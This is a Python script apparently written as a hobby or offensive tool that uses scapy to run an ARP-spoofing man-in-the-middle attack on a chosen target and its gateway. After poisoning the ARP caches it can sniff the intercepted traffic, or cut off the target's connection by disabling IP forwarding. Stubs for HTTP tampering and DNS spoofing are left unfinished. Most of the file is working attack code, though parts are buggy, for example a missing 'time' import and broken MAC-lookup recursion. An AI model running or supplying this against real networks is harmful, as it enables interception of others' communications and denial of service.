from scapy.all import *

import os
from termcolor import colored
import threading
import yaml
import sys

# 1. Allow packet by packet transfer
# Add packet modfication
# Add ssl/tls key modification

class Mitm:
    def __init__(self):
        self.menu = "MITM Menu  \nPlease Select your choice\n1. Setup   2. Start\n4.Exit "
        self.attack_menu_str = "1. Sniff    2. Dos"
        self.router_ip = ""
        self.target_ip = ""
        self.router_mac = ""
        self.target_mac = ""

        self.active = False
        self.forwarding = False

        self.setupmenu = f"Gateway IP Address: {self.router_ip}\nTarget IP Address: {self.target_ip}"
        self.attack_thread = None
        self.enable_ipv4_forward()

        conf.verb = 0
        self.load_config()

    def setup(self):
        # Menu Section
        print(colored(self.setupmenu, "red"))
        self.router_ip = input("Enter Gateway IP Address: ")
        os.system("clear")
        print(colored(f"Gateway IP Address: {self.router_ip}\nTarget IP Address: {self.target_ip}", "red"))
        self.target_ip = input("Enter Target IP address: ")
    
    def attack(self):
        self.active = True
        self.router_mac, self.target_mac = self.get_mac()
        try:
            while self.active:
                target_arp = Ether(dst=self.target_mac)/ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst=self.target_mac)
                router_arp = Ether(dst=self.router_mac)/ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst=self.router_mac)
                sendp(target_arp, verbose=False)
                sendp(router_arp, verbose=False)
                time.sleep(1)
        except:
            pass
    
    def attack_menu(self):
        os.system("clear")
        print(self.attack_menu_str)
        i = int(input("Select an option: "))
        match i:
            case 1:
                self.sniff()
            case 2:
                self.dos()


    def get_mac(self):
        router_packet = ARP(pdst=self.router_ip)
        target_packet = ARP(pdst=self.target_ip)

        router_response = sr1(router_packet, timeout=2)
        target_response = sr1(target_packet, timeout=2)
        
        if router_response is None:
            print("Router MAC could not be found")
            self.get_mac()
        elif target_response is None:
            print("Target MAC could not be found")
            self.get_mac()
        else:
            router_mac = router_response.hwsrc
            target_mac = target_response.hwsrc
            return router_mac, target_mac
    
    def enable_ipv4_forward(self):
        forward_file = "/proc/sys/net/ipv4/ip_forward"
        with open(forward_file, "w+") as f:
            if int(f.readline()) == 1:
                print(colored("[Success] IP forwarding is enabled.", "green"))
                self.forwarding = True
            else:
                print(colored("[Warning] IP forwarding is disabled, attempting to enable.", "yellow"))
                if f.write("1") == 0:
                    print(colored("[Error] Could not enable ip forwarding. Exiting now", "red"))


    def disable_ipv4_forward(self):
        forward_file = "/proc/sys/net/ipv4/ip_forward"
        with open(forward_file, "w+") as f:
            if int(f.readline()) == 1:
                print(colored("[Action] Disabling ip forwarding", "blue"))
                f.write("0")
                self.forwarding = False

    def loop(self):
        os.system("clear")
        print(colored(self.menu, "red"))
        # check if attack mitm is active yet
        if self.active:
            print("MITM is active")
        else:
            print("MITM is not active")
        choice = int(input())
        match choice:
            case 1:
                os.system("clear")
                self.setup()
                self.loop()
            case 2:
                os.system("clear")
                self.attack_thread = threading.Thread(target=self.attack, daemon=True)
                self.attack_thread.start()
                self.attack_menu()
            case 3:
                self.sniff()
            case 4:
                return 0
        
    def sniff(self):
        sniff(prn=lambda pkt: print(pkt.summary()), store=False)

    def dos(self):
        print(f"Active: {self.forwarding}")
        if self.forwarding:
            self.disable_ipv4_forward()
        i = input("1. Stop Dos  2. Return: ")
        if i.lower() == "1":
            self.enable_ipv4_forward()
        else:
            self.attack_menu()


    def load_config(self):
        if os.path.exists("/root/mitm/configs/mitm.yaml"):
            i = input("Would you like to use the config at configs/mitm.yaml [Y/n]")
            if i.lower() == "y":
                with open("/root/mitm/configs/mitm.yaml", "r") as f:
                    data = yaml.load(f, Loader=yaml.SafeLoader)
                    self.router_ip = data.get("router_ip")
                    self.target_ip = data.get("target_ip")

    
    def modify_http_traffic(self):
        '''
        Modify http traffic
        When an http packet is recieved.
        '''

        pass

    def spoofDNS(self):
        pass